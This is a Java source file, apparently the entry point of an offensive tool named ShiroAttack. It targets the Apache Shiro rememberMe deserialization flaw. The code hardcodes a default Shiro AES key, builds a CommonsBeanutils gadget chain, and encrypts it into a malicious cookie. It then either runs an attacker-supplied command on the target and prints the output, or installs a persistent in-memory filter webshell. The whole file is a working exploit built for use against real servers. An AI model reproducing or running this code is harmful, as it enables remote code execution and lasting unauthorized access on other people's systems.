package org.shiroattack;

import cn.hutool.http.HttpResponse;
import org.apache.commons.cli.BasicParser;
import org.apache.commons.cli.CommandLineParser;
import org.apache.commons.cli.HelpFormatter;
import org.apache.commons.cli.Options;
import org.apache.commons.cli.CommandLine;
import org.apache.shiro.codec.Base64;
import java.net.URLEncoder;

import java.util.HashMap;
import java.util.Map;

import static cn.hutool.http.HttpUtil.toParams;

public class Exploit {
    static final String banner = "   _____ __    _            ___   __  __             __  \n" +
            "  / ___// /_  (_)________  /   | / /_/ /_____ ______/ /__\n" +
            "  \\__ \\/ __ \\/ / ___/ __ \\/ /| |/ __/ __/ __ `/ ___/ //_/\n" +
            " ___/ / / / / / /  / /_/ / ___ / /_/ /_/ /_/ / /__/ ,<   \n" +
            "/____/_/ /_/_/_/   \\____/_/  |_\\__/\\__/\\__,_/\\___/_/|_|  \n" +
            "                                                         ";
    // https://patorjk.com/software/taag/#p=display&f=Slant&t=ShiroAttack

    public static void printUsage(Options options) {
        HelpFormatter formatter = new HelpFormatter();
        System.out.println("Shiro Attack MemShell Exploit Tool.\n");
        formatter.printHelp("Options", options);

        System.out.println("\nExample: ");
        System.out.println("java -jar ShiroAttack.jar -p http://127.0.0.1:8080 -u http://192.168.1.1:8089 -k kPH+bIxk5D2deZiIxcaaaA== -m CBC -a TomcatEcho -c id");
        System.out.println("java -jar ShiroAttack.jar -p http://127.0.0.1:8080 -u http://192.168.1.1:8089 -k kPH+bIxk5D2deZiIxcaaaA== -m CBC -a FilterMemShell");
    }

    public static void main(String[] args) throws Exception {
        System.out.println("\n"+banner);

        Options options = new Options();
        options.addOption("h", "help", false,"Print help information.");

        options.addOption("p", "proxy", true, "Proxy Address, eg: http://127.0.0.1:8080");
        options.addOption("u", "url", true, "Target URL, eg: http://192.168.1.1:8089.");

        options.addOption("k", "key", true, "Shiro Key, the default key is kPH+bIxk5D2deZiIxcaaaA==.");
        options.addOption("m", "mode", true, "AES mode, CBC or GCM, the default mode is GCM.");

        options.addOption("a", "attack-type", true,"Type of attack, TomcatEcho or FilterMemShell, The default type is TomcatEcho.");
        options.addOption("c", "cmd",true,"The command that will be executed, only if the attack type is TomcatEcho.");

        options.addOption("t", "timeout",true,"Http Requests Timeout, the default is 20s.");

        CommandLineParser parser = new BasicParser();

        try {
            CommandLine cli = parser.parse(options, args);

            if (args.length < 1 || cli.hasOption("h")) {
                printUsage(options);
                System.exit(0);
            }

            if (cli.hasOption("u")) {
                String url = cli.getOptionValue("u");
                System.out.println("[*] URL: " + url);

                String proxy = cli.getOptionValue("p");
                proxy = (proxy == null) ? "" : proxy;
                if (proxy != null && !proxy.isEmpty()) {
                    System.out.println("[*] Proxy: " + proxy);
                }

                String key = cli.getOptionValue("k");
                key = (key == null) ? "kPH+bIxk5D2deZiIxcaaaA==" : key.trim();
                System.out.println("[*] Shiro Key: " + key);

                String mode = cli.getOptionValue("m");
                mode = (mode == null) ? "GCM" : "CBC";
                System.out.println("[*] Encryption mode: AES-" + mode);

                String attackType = cli.getOptionValue("a");
                attackType = (attackType == null) ? "TomcatEcho" : attackType;
                System.out.println("[*] Type of attack: " + attackType);

                String timeout = cli.getOptionValue("t");
                timeout = (timeout == null)?"20":timeout;
                System.out.println("[*] Timeout: " + timeout + "s");
                int to = Integer.parseInt(timeout) * 1000;

                Object templates;
                if ("FilterMemShell".equals(attackType)) {
                    templates = Gadgets.createTemplatesImpl("DefineClass");
                } else {
                    templates = Gadgets.createTemplatesImpl("TomcatEcho");
                }

                byte[] payload;
                if ("CBC".equals(mode)) {
                    payload = CB183.CBWithoutCC(templates);
                } else {
                    payload = CB192.CBWithoutCC(templates);
                }

                String rememberMeCookie = AESEncrypt.encrypt(payload, Base64.decode(key.toString()), mode);

                Map<String, String> headers = new HashMap<>();

                if ("TomcatEcho".equals(attackType) && cli.hasOption("c")) {
                    String cmd = cli.getOptionValue("c");
                    System.out.println("[*] Command: " + cmd);

                    headers.put("Cookie", "rememberMe="+rememberMeCookie);
                    headers.put("CMD", cmd);

                    HttpResponse r = Http.get(url, headers, proxy, to);
                    System.out.println("\n"+r.body().trim()+"\n");

                } else if ("FilterMemShell".equals(attackType)) {
                    headers.put("Cookie", "rememberMe="+rememberMeCookie);
                    headers.put("Content-Type", "application/x-www-form-urlencoded");

                    String classContent = Gadgets.toBase64(FilterMemShell.class);

                    String body = "class=" +  URLEncoder.encode(classContent, "UTF-8");

                    HttpResponse r = Http.post(url, body, headers, proxy, to);

                    if (r.body().contains("has been successfully added")) {
                        System.out.println("[+] The exploit has been completed, Please add a " +
                                "`CMD: id` header to the HTTP request to exploit the vulnerability.");
                    } else {
                        System.out.println("[-] Failed to exploit the vulnerability.");
                    }
                }
            } else {
                printUsage(options);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

}
